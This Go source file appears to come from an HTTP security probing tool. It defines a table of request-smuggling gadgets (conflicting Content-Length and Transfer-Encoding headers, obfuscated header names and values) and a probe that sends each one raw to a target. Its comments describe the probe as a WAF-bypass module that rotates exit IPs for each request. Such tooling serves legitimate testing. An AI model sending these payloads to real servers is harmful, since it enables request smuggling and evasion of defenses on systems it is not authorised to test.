package probe

import (
	"context"
	"fmt"
	"io"
	"net"
	"time"

	rawhttp "github.com/projectdiscovery/rawhttp/client"
)

// Gadget is one framing or header mutation. Names are stable identifiers so a
// report can point at the exact mutation that worked.
type Gadget struct {
	Name    string
	Headers []rawhttp.Header
	Body    []byte
}

// Gadgets returns the built-in mutation table. The list is deliberately small
// and hand-written rather than scraped: each entry is a documented parser
// disagreement, and every byte of it ends up on the wire unchanged.
//
// The categories mirror public smuggling gadget research: duplicated framing
// headers, whitespace before the colon, tab after the colon, non-canonical
// numeric forms and case variations. Add your own table with LoadGadgets.
func Gadgets() []Gadget {
	clteBody := []byte("0\r\n\r\nG")
	base := func(cl, te string) []rawhttp.Header {
		return []rawhttp.Header{
			{Key: "Content-Length", Value: cl},
			{Key: "Transfer-Encoding", Value: te},
		}
	}
	return []Gadget{
		{Name: "cl-te-classic", Headers: base("6", "chunked"), Body: clteBody},
		{Name: "te-space-before-colon", Headers: []rawhttp.Header{
			{Key: "Content-Length", Value: "6"},
			{Key: "Transfer-Encoding ", Value: "chunked"},
		}, Body: clteBody},
		{Name: "te-tab-value", Headers: []rawhttp.Header{
			{Key: "Content-Length", Value: "6"},
			{Key: "Transfer-Encoding", Value: "\tchunked"},
		}, Body: clteBody},
		{Name: "te-duplicate", Headers: []rawhttp.Header{
			{Key: "Content-Length", Value: "6"},
			{Key: "Transfer-Encoding", Value: "chunked"},
			{Key: "Transfer-Encoding", Value: "identity"},
		}, Body: clteBody},
		{Name: "te-case", Headers: []rawhttp.Header{
			{Key: "Content-Length", Value: "6"},
			{Key: "Transfer-Encoding", Value: "Chunked"},
		}, Body: clteBody},
		{Name: "cl-duplicate", Headers: []rawhttp.Header{
			{Key: "Content-Length", Value: "6"},
			{Key: "Content-Length", Value: "0"},
			{Key: "Transfer-Encoding", Value: "chunked"},
		}, Body: clteBody},
		{Name: "cl-leading-zero", Headers: base("06", "chunked"), Body: clteBody},
		{Name: "cl-plus", Headers: base("+6", "chunked"), Body: clteBody},
		{Name: "cl-hex", Headers: base("0x6", "chunked"), Body: clteBody},
		{Name: "cl-comma", Headers: base("6, 6", "chunked"), Body: clteBody},
		{Name: "cl-space-before-colon", Headers: []rawhttp.Header{
			{Key: "Content-Length ", Value: "6"},
			{Key: "Transfer-Encoding", Value: "chunked"},
		}, Body: clteBody},
	}
}

// GadgetProbe sends exactly one gadget request and records the raw response.
// A gadget is one request by definition, so the caller rotates the IP per
// gadget with Runner.Rotate instead of reusing a connection.
//
// This is the WAF-bypass / fuzzing module: the probe owns no policy, the pool
// provides a fresh exit IP, and the gadget list decides which syntax variants
// are tried.
type GadgetProbe struct {
	Gadget Gadget
	Method string
	// Path overrides the request path.
	Path string

	Timeout   time.Duration
	Idle      time.Duration
	MaxHeader int64
	MaxBody   int64

	// Headers switches the probe to binary-search group testing. Each header
	// receives a fresh crypto-random canary per request; the candidate set is
	// bisected only when the response changes.
	Headers             []string
	BatchSize           int
	MaxRequests         int
	MaxAttempts         int
	StructuralThreshold float64

	// canaryReader is internal. Tests replace it to make canaries
	// deterministic; production uses crypto/rand.Reader.
	canaryReader io.Reader
}

func (p *GadgetProbe) Name() string {
	if p.batchMode() {
		return "gadget/binary-search"
	}
	if p.Gadget.Name == "" {
		return "gadget/unnamed"
	}
	return "gadget/" + p.Gadget.Name
}

func (p *GadgetProbe) Execute(ctx context.Context, target Target, conn net.Conn) (*Result, error) {
	if p.batchMode() {
		return p.search(ctx, target, &fixedConnSource{conn: conn}, false)
	}
	return p.executeSingle(ctx, target, conn)
}

func (p *GadgetProbe) executeSingle(ctx context.Context, target Target, conn net.Conn) (*Result, error) {
	if len(p.Gadget.Headers) == 0 {
		return nil, fmt.Errorf("probe: gadget has no headers")
	}
	method := p.Method
	if method == "" {
		method = "POST"
	}
	path := p.Path
	if path == "" {
		path = target.RequestPath()
	}
	e := newExec(ctx, p.Name(), target, conn, p.Timeout, p.MaxHeader, p.MaxBody)
	headers := make([]rawhttp.Header, 0, len(p.Gadget.Headers)+3)
	headers = append(headers,
		rawhttp.Header{Key: "Host", Value: target.HostHeader()},
		rawhttp.Header{Key: "User-Agent", Value: "omnislash-probe/1"},
		rawhttp.Header{Key: "Connection", Value: "keep-alive"},
	)
	headers = append(headers, p.Gadget.Headers...)
	payload, err := render(requestSpec{Method: method, Path: path, Headers: headers, Body: p.Gadget.Body})
	if err != nil {
		return e.finish(), fmt.Errorf("probe: render gadget: %w", err)
	}
	if err := e.write(payload); err != nil {
		return e.finish(), err
	}
	resp, err := e.read()
	if err != nil && !isTimeout(err) && resp == nil {
		return e.finish(), err
	}
	if resp != nil {
		// 400/501 for a gadget that a clean request passes is a parser
		// disagreement, not a bypass. Report it as a rejection with low
		// confidence; only the operator's baseline can confirm.
		if isCorruptionStatus(resp.Status) {
			e.addFinding(Finding{
				Kind:       "gadget_rejected",
				Confidence: ConfidenceLow,
				Detail:     fmt.Sprintf("gadget %q returned status %d", p.Gadget.Name, resp.Status),
				Response:   resp.Seq,
			})
		}
	}
	return e.finish(), nil
}
